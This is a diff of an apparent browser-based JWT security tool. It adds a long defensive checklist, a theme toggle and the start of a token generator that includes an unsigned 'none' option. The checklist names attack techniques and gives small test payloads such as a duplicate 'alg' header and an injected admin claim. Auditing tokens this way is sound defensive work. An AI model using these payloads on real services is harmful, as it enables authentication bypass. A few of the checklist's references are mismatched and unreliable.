+        <tr data-risk="low" data-text="cors cross origin resource sharing authorization header exposure wildcard"><td class="check-icon">🔵</td><td><div class="check-name">CORS Misconfiguration Leaking Token</div><div class="check-desc">A wildcard CORS policy (<code>Access-Control-Allow-Origin: *</code>) combined with <code>credentials: true</code> allows cross-origin sites to read Authorization headers.</div><div class="check-ref">Ref: OWASP CORS Security · RFC 6454</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="medium" data-text="token postmessage iframe cross frame leakage javascript window origin"><td class="check-icon">🟡</td><td><div class="check-name">Token Leakage via postMessage</div><div class="check-desc">When passing tokens between frames or windows using <code>postMessage</code>, verify the target origin is explicitly specified — never use <code>*</code> as the target origin.</div><div class="check-ref">Ref: MDN postMessage security · CWE-346</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑦ Key Management -->
+    <div class="checklist-section" data-section="Key Management">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Key Management</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="secret entropy 256 bit csprng random generation weak short key human memorable"><td class="check-icon">🟠</td><td><div class="check-name">Secret Entropy Below 256 Bits</div><div class="check-desc">HMAC secrets must be at least 32 cryptographically random bytes (256 bits). Anything shorter or derived from human-memorable strings is unsafe.</div><div class="check-ref">Ref: RFC 7518 §3.2 · NIST SP 800-132</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="key rotation policy signing key expire retire old keys schedule"><td class="check-icon">🟠</td><td><div class="check-name">No Key Rotation Policy</div><div class="check-desc">Define and implement a key rotation schedule (e.g., every 90 days or after suspected compromise). Old keys must be retired after rotation; publish new keys via JWKS.</div><div class="check-ref">Ref: NIST SP 800-57 · RFC 7517 JWKS</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="secret hardcoded source code environment variable git commit exposure version control"><td class="check-icon">🟠</td><td><div class="check-name">Secret Hardcoded in Source Code</div><div class="check-desc">JWT secrets hardcoded in code, config files, or committed to version control are trivially discoverable. Use secrets management (Vault, AWS Secrets Manager, etc.).</div><div class="check-ref">Ref: CWE-321 · OWASP A02:2021 Cryptographic Failures</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="jwks endpoint unauthenticated public key exposure not validated rate limit"><td class="check-icon">🟡</td><td><div class="check-name">JWKS Endpoint Not Properly Secured</div><div class="check-desc">The JWKS endpoint should be read-only, rate-limited, and cached. Ensure it does not expose private key material and serves only public verification keys.</div><div class="check-ref">Ref: RFC 7517 §5 · RFC 8414 Authorization Server Metadata</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="private key exposure rsa ec storage permissions file system hsm enclave"><td class="check-icon">🟡</td><td><div class="check-name">Private Key Improper Storage</div><div class="check-desc">RSA/EC private keys must be stored with restrictive file permissions (600), ideally in HSM or secure enclaves. Never log or expose private key material.</div><div class="check-ref">Ref: NIST SP 800-57 · PKCS#11 · HSM best practices</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="kid key id enumeration discovery brute force sequential integer value"><td class="check-icon">🔵</td><td><div class="check-name">kid Enumeration / Discovery</div><div class="check-desc">If kid values are sequential integers (1, 2, 3), attackers can enumerate valid key IDs. Use non-sequential UUIDs or opaque identifiers for kid values.</div><div class="check-ref">Ref: RFC 7517 §4.5 · Security through obscurity</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="medium" data-text="multiple signing keys simultaneous active rotation kid header missing confusion"><td class="check-icon">🟡</td><td><div class="check-name">Multiple Active Signing Keys Without kid</div><div class="check-desc">When multiple keys are active (during rotation), all tokens must include a kid header. Without it, servers must try all keys, increasing the attack surface for key confusion.</div><div class="check-ref">Ref: RFC 7517 §4.5 · Key rotation best practices</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑧ OAuth 2.0 & OIDC Integration -->
+    <div class="checklist-section" data-section="OAuth 2.0 and OIDC Integration">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> OAuth 2.0 &amp; OIDC Integration</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="authorization code pkce implicit flow token leakage spa public client fragment"><td class="check-icon">🟠</td><td><div class="check-name">Implicit Flow Usage (OAuth 2.0)</div><div class="check-desc">The OAuth 2.0 implicit flow returns tokens in the URL fragment — exposing them to browser history and referrer leakage. Migrate to Authorization Code + PKCE.</div><div class="check-ref">Ref: OAuth 2.0 Security BCP §2.1.2 · RFC 9700</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="pkce code verifier challenge missing authorization code injection public client"><td class="check-icon">🟠</td><td><div class="check-name">PKCE Not Implemented (Public Clients)</div><div class="check-desc">Public clients (SPAs, mobile apps) must use PKCE (RFC 7636). Without it, authorization codes intercepted via redirect URI attacks can be exchanged for tokens.</div><div class="check-ref">Ref: RFC 7636 · OAuth 2.0 Security BCP §2.1</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="critical" data-text="redirect uri validation open redirect token hijacking authorization code steal"><td class="check-icon">🔴</td><td><div class="check-name">Open Redirect in redirect_uri</div><div class="check-desc">If the authorization server does not strictly validate redirect_uri against a registered whitelist, attackers can steal authorization codes or tokens via open redirect.</div><div class="check-ref">Ref: RFC 6749 §10.6 · OAuth 2.0 Security BCP §4.1</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="state parameter csrf oauth flow missing nonce replay protection"><td class="check-icon">🟠</td><td><div class="check-name">Missing state Parameter (CSRF in OAuth)</div><div class="check-desc">The state parameter prevents CSRF attacks during the OAuth authorization flow. Verify it is generated with sufficient entropy and validated on callback.</div><div class="check-ref">Ref: RFC 6749 §10.12 · OAuth 2.0 Security BCP §2.1</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="nonce oidc id token replay openid connect validation missing check"><td class="check-icon">🟠</td><td><div class="check-name">Missing nonce in OIDC ID Token</div><div class="check-desc">The nonce in OIDC ID tokens prevents replay attacks. Clients must validate that the nonce in the ID token matches the one sent in the authorization request.</div><div class="check-ref">Ref: OIDC Core §3.1.2.1 · RFC 6749</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="at_hash c_hash token binding id token access token validation code hash"><td class="check-icon">🟡</td><td><div class="check-name">at_hash / c_hash Not Validated</div><div class="check-desc">OIDC ID tokens include at_hash (access token hash) and c_hash (code hash). Clients should validate these to ensure the access token and code correspond to the ID token.</div><div class="check-ref">Ref: OIDC Core §3.3.2.11</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="scope overly broad permissions oauth access token least privilege admin wildcard"><td class="check-icon">🟡</td><td><div class="check-name">Overly Broad OAuth Scopes</div><div class="check-desc">Request only the minimum necessary scopes. Broad scopes like <code>*</code> or <code>admin</code> increase the blast radius if a token is compromised.</div><div class="check-ref">Ref: RFC 6749 §3.3 · PoLP principle</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="high" data-text="dpop demonstration proof possession token binding sender constrained api key"><td class="check-icon">🟠</td><td><div class="check-name">DPoP Not Implemented (Sender-Constrained Tokens)</div><div class="check-desc">DPoP (RFC 9449) binds access tokens to a client's private key, preventing stolen token reuse. Implement DPoP for high-value API access.</div><div class="check-ref">Ref: RFC 9449 DPoP · OAuth 2.0 Security BCP §2.2.1</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑨ Library & Framework Security -->
+    <div class="checklist-section" data-section="Library and Framework Security">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Library &amp; Framework Security</div>
+      <table class="checklist-table">
+        <tr data-risk="critical" data-text="jwt library cve vulnerability outdated version patched update advisory"><td class="check-icon">🔴</td><td><div class="check-name">Outdated JWT Library with Known CVEs</div><div class="check-desc">Check your JWT library version against the NVD and GitHub Security Advisories. Many critical CVEs (e.g., CVE-2015-9235, CVE-2022-39227) affect popular libraries.</div><div class="check-ref">Ref: NVD CVE Database · GitHub Security Advisories</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="algorithm auto detect library option decode verify trust header alg value"><td class="check-icon">🟠</td><td><div class="check-name">Library Algorithm Auto-Detection Enabled</div><div class="check-desc">Never pass the algorithm from the token header to the library's verify function. The algorithm must be hardcoded server-side, not trusted from the untrusted token.</div><div class="check-ref">Ref: CVE-2015-9235 · RFC 8725 §2.1</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="decode without verify jwt library misconfiguration bypass authentication path"><td class="check-icon">🟠</td><td><div class="check-name">Using Decode Instead of Verify</div><div class="check-desc">Code review red flag: using <code>jwt.decode()</code> (no verification) in authentication paths instead of <code>jwt.verify()</code>. Decode-only functions skip all security checks.</div><div class="check-ref">Ref: CWE-347 Improper Verification of Cryptographic Signature</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="library default options permissive insecure expiry check disabled misconfigured"><td class="check-icon">🟡</td><td><div class="check-name">Insecure Library Default Options</div><div class="check-desc">Some JWT libraries disable expiration checking or signature verification by default. Explicitly configure: <code>verify_exp=True</code>, <code>verify_signature=True</code>, and required algorithms.</div><div class="check-ref">Ref: PyJWT docs · jsonwebtoken docs</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="timing side channel attack hmac comparison signature verification constant time function"><td class="check-icon">🟡</td><td><div class="check-name">Non–Constant-Time Signature Comparison</div><div class="check-desc">Signature comparison must use constant-time comparison functions (e.g., <code>hmac.compare_digest()</code>). Variable-time comparison leaks timing information enabling brute-force.</div><div class="check-ref">Ref: CWE-208 · RFC 6151 Timing Attacks</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="exception handling error message verbose leak library version algorithm name"><td class="check-icon">🔵</td><td><div class="check-name">Verbose JWT Error Messages</div><div class="check-desc">Error messages like "Invalid signature for HS256" reveal the algorithm and validation details to attackers. Use generic messages: "Authentication failed."</div><div class="check-ref">Ref: CWE-209 Information Exposure Through Error Message</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="info" data-text="json parsing quirks duplicate keys whitespace injection unicode normalization claim"><td class="check-icon">⚪</td><td><div class="check-name">JSON Parsing Quirks &amp; Duplicate Keys</div><div class="check-desc">Different JSON parsers handle duplicate keys differently. Injecting <code>{"alg":"RS256","alg":"none"}</code> may confuse parsers — test for inconsistent claim resolution.</div><div class="check-ref">Ref: RFC 7159 §4 · Parsing differential research</div></td><td><span class="check-risk sev-info">INFO</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑩ Microservices & API Gateway -->
+    <div class="checklist-section" data-section="Microservices and API Gateway">
+      <div class="checklist-section-title"><span class="sev-badge sev-medium">Medium</span> Microservices &amp; API Gateway</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="gateway bypass internal service direct access no token validation network"><td class="check-icon">🟠</td><td><div class="check-name">Direct Internal Service Access (Gateway Bypass)</div><div class="check-desc">If microservices are accessible directly without going through the API gateway, attackers can bypass JWT validation entirely. Use network-level controls (mTLS, VPC) plus application-level validation.</div><div class="check-ref">Ref: OWASP API Top 10 · Zero-Trust Architecture</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="service to service authentication internal jwt no verification trust shared secret"><td class="check-icon">🟠</td><td><div class="check-name">Insecure Service-to-Service Authentication</div><div class="check-desc">Internal microservice calls should use mTLS or short-lived service JWTs — not shared secrets or no authentication at all. Avoid implicit trust within the perimeter.</div><div class="check-ref">Ref: NIST Zero Trust Architecture SP 800-207</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="token forwarding pass through gateway microservice scoped audience exchange"><td class="check-icon">🟡</td><td><div class="check-name">Token Pass-Through Without Scope Restriction</div><div class="check-desc">API gateways that forward the original user JWT to downstream services allow those services to see full user permissions. Use token exchange (RFC 8693) to issue scoped downstream tokens.</div><div class="check-ref">Ref: RFC 8693 Token Exchange · OWASP API Security</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="jwt validation caching gateway stale token accepted revoked compromised key jwks ttl"><td class="check-icon">🟡</td><td><div class="check-name">Stale Token Validation Cache at Gateway</div><div class="check-desc">If the API gateway caches JWKS keys aggressively, it may continue accepting tokens signed by a rotated/compromised key. Tune JWKS cache TTL appropriately (&lt;5 min).</div><div class="check-ref">Ref: RFC 7517 §5 · API Gateway JWKS caching</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="audience confusion cross microservice token reuse horizontal privilege aud validation"><td class="check-icon">🟡</td><td><div class="check-name">Audience Confusion Across Microservices</div><div class="check-desc">Each microservice should validate the aud claim and only accept tokens intended for it. Without strict aud validation, a token for service A can be replayed at service B.</div><div class="check-ref">Ref: RFC 7519 §4.1.3 · Microservices JWT patterns</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="propagation correlation id tracing jwt claim distributed system forensics"><td class="check-icon">🔵</td><td><div class="check-name">Missing Request Correlation in JWT Claims</div><div class="check-desc">Include trace/correlation IDs in JWT claims or headers to enable end-to-end request tracing across microservices — important for security incident investigation.</div><div class="check-ref">Ref: OpenTelemetry Security Observability</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑪ Logging, Monitoring & Incident Response -->
+    <div class="checklist-section" data-section="Logging Monitoring and Incident Response">
+      <div class="checklist-section-title"><span class="sev-badge sev-medium">Medium</span> Logging, Monitoring &amp; Incident Response</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="token logged plaintext access log audit trail secret exposure aggregation"><td class="check-icon">🟠</td><td><div class="check-name">JWT Token Logged in Plaintext</div><div class="check-desc">Never log full JWT tokens. Log only non-sensitive metadata: jti, sub, iss, exp, aud. Full tokens in logs represent credential exposure in log aggregation systems.</div><div class="check-ref">Ref: OWASP Logging Cheat Sheet · CWE-532</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="failed validation monitoring alert detect attack replay brute force anomaly siem"><td class="check-icon">🟠</td><td><div class="check-name">No Alerting on JWT Validation Failures</div><div class="check-desc">Spikes in JWT validation failures (invalid signature, expired token, unknown kid) indicate active attacks. Implement real-time alerting on abnormal failure rates.</div><div class="check-ref">Ref: OWASP Logging Cheat Sheet · NIST IR 7298</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="incident response plan compromised secret key rotation playbook runbook"><td class="check-icon">🟡</td><td><div class="check-name">No Incident Response Plan for Key Compromise</div><div class="check-desc">Define and document a key compromise runbook: how to rotate keys, invalidate existing tokens, notify affected users, and audit token usage from the compromise window.</div><div class="check-ref">Ref: NIST SP 800-61 · OWASP Security Incident Management</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="token usage anomaly detection ip geolocation user agent unusual pattern behavioral"><td class="check-icon">🟡</td><td><div class="check-name">No Token Usage Anomaly Detection</div><div class="check-desc">Monitor for token usage anomalies: simultaneous use from multiple IPs, unusual geolocations, or abnormal request frequencies — may indicate token theft or sharing.</div><div class="check-ref">Ref: OWASP A09:2021 · Behavioral analytics</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="token audit trail issuance revocation lifecycle tracking jti forensic investigation"><td class="check-icon">🔵</td><td><div class="check-name">No Token Issuance Audit Trail</div><div class="check-desc">Maintain an audit log of token issuance (who issued, when, for what scope). This is critical for forensic investigation after a security incident.</div><div class="check-ref">Ref: PCI DSS §10 · OWASP Logging Cheat Sheet</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="info" data-text="token metadata dashboard real time monitoring jti usage statistics metrics"><td class="check-icon">⚪</td><td><div class="check-name">JWT Usage Metrics &amp; Dashboards</div><div class="check-desc">Implement metrics for: tokens issued/hour, validation failure rate by type, algorithm distribution, average token lifetime. Use these to detect drift from secure baselines.</div><div class="check-ref">Ref: OWASP Security Observability</div></td><td><span class="check-risk sev-info">INFO</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑫ Mobile & Client-Side Security -->
+    <div class="checklist-section" data-section="Mobile and Client-Side Security">
+      <div class="checklist-section-title"><span class="sev-badge sev-high">High</span> Mobile &amp; Client-Side Security</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="mobile app token storage keychain keystore secure enclave android ios encrypted"><td class="check-icon">🟠</td><td><div class="check-name">Insecure Token Storage on Mobile</div><div class="check-desc">On iOS, store tokens in Keychain with <code>kSecAttrAccessibleWhenUnlockedThisDeviceOnly</code>. On Android, use EncryptedSharedPreferences or Android Keystore. Never use plain SharedPreferences or NSUserDefaults.</div><div class="check-ref">Ref: OWASP MASVS-STORAGE-1 · iOS/Android Security Guide</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="certificate pinning bypass ssl mobile app mitm interception intercept proxy"><td class="check-icon">🟠</td><td><div class="check-name">No Certificate Pinning on Mobile</div><div class="check-desc">Without certificate pinning, a compromised root CA or MITM proxy can intercept JWT tokens in transit. Implement certificate or public key pinning for mobile API clients.</div><div class="check-ref">Ref: OWASP MASVS-NETWORK-2 · RFC 7469</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="token in webview javascript bridge hybrid app exposure native"><td class="check-icon">🟡</td><td><div class="check-name">Token Exposure in WebView JavaScript Bridge</div><div class="check-desc">In hybrid mobile apps, WebView JavaScript interfaces may expose JWT tokens to web content. Limit the JavaScript bridge surface and avoid passing tokens through it.</div><div class="check-ref">Ref: OWASP MASVS-PLATFORM · Android WebView security</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="biometric authentication binding token device bound secure enclave tee proof possession"><td class="check-icon">🟡</td><td><div class="check-name">Token Not Bound to Biometric / Device Auth</div><div class="check-desc">For high-security mobile apps, bind token access to biometric authentication via the device's secure enclave (iOS Secure Enclave / Android StrongBox) using proof-of-possession keys.</div><div class="check-ref">Ref: FIDO2 · OWASP MASVS-AUTH</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="jailbreak root detection token extraction compromise mobile environment bypass"><td class="check-icon">🟡</td><td><div class="check-name">No Jailbreak / Root Detection</div><div class="check-desc">On jailbroken/rooted devices, token storage protections are bypassed. Implement jailbreak/root detection as a defense-in-depth measure for high-security applications.</div><div class="check-ref">Ref: OWASP MASVS-RESILIENCE · iOS/Android detection</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="memory dump token extraction process memory resident in memory mobile zero out"><td class="check-icon">🔵</td><td><div class="check-name">Token Remains in Memory After Use</div><div class="check-desc">Tokens held in application memory may be extractable through memory dumps. Minimize in-memory token lifetime — zero out buffers after use where the language allows it.</div><div class="check-ref">Ref: CWE-316 · OWASP MASVS-STORAGE</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑬ Advanced Attack Techniques -->
+    <div class="checklist-section" data-section="Advanced Attack Techniques">
+      <div class="checklist-section-title"><span class="sev-badge sev-critical">Critical</span> Advanced Attack Techniques</div>
+      <table class="checklist-table">
+        <tr data-risk="critical" data-text="jwt injection header claim pollution double url encoding unicode bypass parser"><td class="check-icon">🔴</td><td><div class="check-name">JWT Claim Injection / Pollution</div><div class="check-desc">Test injecting additional claims via URL encoding, double encoding, or Unicode normalization. Some parsers may be tricked into accepting extra claims (e.g., injecting <code>&amp;admin=true</code> in a form-encoded token).</div><div class="check-ref">Ref: HTTP Parameter Pollution · Unicode normalization attacks</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="ec signature malleability es256 low s value r s bias ecdsa psychic signatures java"><td class="check-icon">🔴</td><td><div class="check-name">ECDSA Signature Malleability</div><div class="check-desc">ECDSA signatures are malleable — for every valid (r,s), (r, n-s) is also valid. If not normalized, attackers can produce alternative valid signatures for the same payload.</div><div class="check-ref">Ref: CVE-2022-21449 Psychic Signatures (Java) · SEC1</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="critical" data-text="bleichenbacher attack rsa pkcs1 v1.5 padding oracle signature forgery private key recovery"><td class="check-icon">🔴</td><td><div class="check-name">RSA Bleichenbacher / Padding Oracle Attack</div><div class="check-desc">If using RSA PKCS#1 v1.5 padding (RS256 with old libraries), test for Bleichenbacher-style oracle attacks that can recover the private key or forge signatures.</div><div class="check-ref">Ref: CVE-2017-15361 ROCA · Bleichenbacher 1998</div></td><td><span class="check-risk sev-critical">CRITICAL</span></td></tr>
+        <tr data-risk="high" data-text="confused deputy cross service token reuse horizontal privilege escalation forward"><td class="check-icon">🟠</td><td><div class="check-name">Confused Deputy via Token Forwarding</div><div class="check-desc">When a frontend service forwards user tokens to internal APIs, the internal APIs may perform actions on behalf of the user without proper authorization checks (confused deputy pattern).</div><div class="check-ref">Ref: OWASP API Security Top 10 2023</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="jwt substitution attack token swap different user same service replay context"><td class="check-icon">🟠</td><td><div class="check-name">Token Substitution Attack</div><div class="check-desc">If a service validates tokens but doesn't bind them to the specific request context (e.g., user, action), a valid token from one context may be substituted into another.</div><div class="check-ref">Ref: RFC 8725 §2.2 · Confused Deputy attacks</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="high" data-text="timing attack secret inference brute force online token validation rate constant"><td class="check-icon">🟠</td><td><div class="check-name">Online Timing Attack on Token Validation</div><div class="check-desc">Measure response times for tokens with different signatures — timing differences may leak partial information about the secret. Ensure constant-time comparison at the network level too.</div><div class="check-ref">Ref: CWE-208 · Bernstein Timing Attacks</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="decompression bomb gzip zlib large payload dos resource exhaustion jwe compressed"><td class="check-icon">🟡</td><td><div class="check-name">Decompression Bomb in Compressed JWT (JWE)</div><div class="check-desc">JWE supports deflate compression. A maliciously crafted compressed payload can expand to gigabytes, causing DoS. Validate decompressed size before processing.</div><div class="check-ref">Ref: RFC 7516 §4.1.3 · CWE-409</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="dos large payload oversized jwt header processing resource exhaustion size limit"><td class="check-icon">🟡</td><td><div class="check-name">Oversized JWT Denial of Service</div><div class="check-desc">Set maximum token size limits (recommended: 8 KB). Some parsers allocate memory proportional to input size — a crafted enormous JWT can exhaust server memory.</div><div class="check-ref">Ref: CWE-400 · RFC 7518 §3</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+      </table>
+    </div>
+
+    <!-- ⑭ Implementation Best Practices -->
+    <div class="checklist-section" data-section="Implementation Best Practices">
+      <div class="checklist-section-title"><span class="sev-badge sev-low">Low / Info</span> Implementation Best Practices</div>
+      <table class="checklist-table">
+        <tr data-risk="high" data-text="algorithm whitelist enforced server side never trust header alg value hardcode"><td class="check-icon">🟠</td><td><div class="check-name">Algorithm Whitelist Enforced Server-Side</div><div class="check-desc">The server must maintain an explicit algorithm whitelist. Never derive the algorithm from the token header. Hard-code expected algorithms in verification logic.</div><div class="check-ref">Ref: RFC 8725 §2.1 · OWASP JWT Cheat Sheet</div></td><td><span class="check-risk sev-high">HIGH</span></td></tr>
+        <tr data-risk="medium" data-text="rate limiting token endpoint issuance abuse brute force protection credential stuffing"><td class="check-icon">🟡</td><td><div class="check-name">Rate Limiting on Token Endpoints</div><div class="check-desc">Token issuance and refresh endpoints must be rate-limited per IP and per user. Detect and block credential stuffing and brute-force attacks early.</div><div class="check-ref">Ref: OWASP A04:2021 · RFC 6585</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="token revocation blacklist logout compromised credential jti list redis db"><td class="check-icon">🟡</td><td><div class="check-name">Token Revocation / Blacklist Mechanism</div><div class="check-desc">Implement a jti-based revocation list (Redis, DB) for immediate invalidation on logout, password change, or security events. Revocation without jti is impossible.</div><div class="check-ref">Ref: RFC 7009 Token Revocation · OWASP Auth Cheat Sheet</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="medium" data-text="jwe payload encryption sensitive claims encrypt not just sign confidentiality"><td class="check-icon">🟡</td><td><div class="check-name">Use JWE for Sensitive Payloads</div><div class="check-desc">JWT only signs — it does not encrypt. For sensitive claims, use JWE (JSON Web Encryption / RFC 7516) to ensure confidentiality in addition to integrity.</div><div class="check-ref">Ref: RFC 7516 JWE · OWASP Cryptographic Failures</div></td><td><span class="check-risk sev-medium">MEDIUM</span></td></tr>
+        <tr data-risk="low" data-text="clock skew tolerance 60 seconds exp nbf ntp synchronization server time"><td class="check-icon">🔵</td><td><div class="check-name">Clock Skew Tolerance ≤ 60 Seconds</div><div class="check-desc">Allow at most 60 seconds of clock skew for exp and nbf validation. Larger windows increase the attack surface. Ensure all servers sync time via NTP/PTP.</div><div class="check-ref">Ref: RFC 7519 §4.1.4 · RFC 7518 §3</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="low" data-text="unique jti per token uuid v4 csprng not sequential not timestamp random"><td class="check-icon">🔵</td><td><div class="check-name">Cryptographically Random jti Values</div><div class="check-desc">Use UUID v4 or ≥128 bits of CSPRNG output for jti. Avoid sequential integers, timestamps alone, or deterministic values — these are predictable and reusable.</div><div class="check-ref">Ref: RFC 7519 §4.1.7 · NIST SP 800-90A</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="low" data-text="minimum token size maximum payload size claim count limit validation 8kb"><td class="check-icon">🔵</td><td><div class="check-name">Enforce Maximum Token Size</div><div class="check-desc">Define and enforce maximum JWT size (e.g., 8 KB) at the API gateway and application layer to prevent DoS via oversized tokens.</div><div class="check-ref">Ref: CWE-400 · nginx / AWS API Gateway limits</div></td><td><span class="check-risk sev-low">LOW</span></td></tr>
+        <tr data-risk="info" data-text="documentation security review code review jwt usage patterns library choice audit"><td class="check-icon">⚪</td><td><div class="check-name">Security-Focused Code Review of JWT Usage</div><div class="check-desc">Conduct periodic code reviews specifically auditing JWT library usage: verify function choice, option flags, error handling, and claim validation patterns across all token-consuming services.</div><div class="check-ref">Ref: OWASP Code Review Guide</div></td><td><span class="check-risk sev-info">INFO</span></td></tr>
+        <tr data-risk="info" data-text="dependency scanning sca software composition analysis jwt library cve automated ci cd"><td class="check-icon">⚪</td><td><div class="check-name">Automated Dependency Scanning for JWT Libraries</div><div class="check-desc">Integrate SCA tools (Dependabot, Snyk, OWASP Dependency-Check) into CI/CD to automatically detect and alert on vulnerable JWT library versions.</div><div class="check-ref">Ref: OWASP A06:2021 Vulnerable Components</div></td><td><span class="check-risk sev-info">INFO</span></td></tr>
+        <tr data-risk="info" data-text="developer training secure jwt coding awareness education security culture tabletop"><td class="check-icon">⚪</td><td><div class="check-name">Developer Security Training on JWT</div><div class="check-desc">Ensure all developers who implement or use JWT understand the top attack vectors (alg:none, algorithm confusion, HMAC bruteforce). Regular tabletop exercises help.</div><div class="check-ref">Ref: OWASP Security Knowledge Framework</div></td><td><span class="check-risk sev-info">INFO</span></td></tr>
       </table>
     </div>
 
@@ -1108,8 +2653,8 @@ function switchTab(id) {
   document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
   document.querySelectorAll('.main-tab').forEach(b => b.classList.remove('active'));
   document.getElementById('tab-'+id).classList.add('active');
-  const idx = ['decoder','bruteforce','editor','checklist'].indexOf(id);
-  document.querySelectorAll('.main-tab')[idx].classList.add('active');
+  const idx = ['decoder','bruteforce','editor','generator','attack','checklist'].indexOf(id);
+  if (idx >= 0) document.querySelectorAll('.main-tab')[idx].classList.add('active');
 }
 
 /* ═══════════════════════════════════════════════════════
@@ -1710,10 +3255,811 @@ function copyGenerated() {
   }
 }
 
+
+/* ═══════════════════════════════════════════════════════
+   Dark / Light Mode Toggle
+═══════════════════════════════════════════════════════ */
+function toggleTheme() {
+  const html = document.documentElement;
+  html.classList.toggle('light');
+  localStorage.setItem('jwt-theme', html.classList.contains('light') ? 'light' : 'dark');
+}
+// Restore saved theme
+(function() {
+  const saved = localStorage.getItem('jwt-theme');
+  if (saved === 'light') document.documentElement.classList.add('light');
+})();
+
+/* ═══════════════════════════════════════════════════════
+   JWT Generator
+═══════════════════════════════════════════════════════ */
+
+const JG_ALG_DESCS = {
+  'none':  'Unsigned token — no signature. For testing only.',
+  'HS256': 'HMAC SHA-256 — symmetric shared secret signing',
+  'HS384': 'HMAC SHA-384 — symmetric shared secret signing',
+  'HS512': 'HMAC SHA-512 — symmetric shared secret signing',
+  'RS256': 'RSA PKCS#1 v1.5 + SHA-256 — asymmetric signing',
+  'RS384': 'RSA PKCS#1 v1.5 + SHA-384 — asymmetric signing',
+  'RS512': 'RSA PKCS#1 v1.5 + SHA-512 — asymmetric signing',
+  'ES256': 'ECDSA P-256 + SHA-256 — elliptic curve signing',
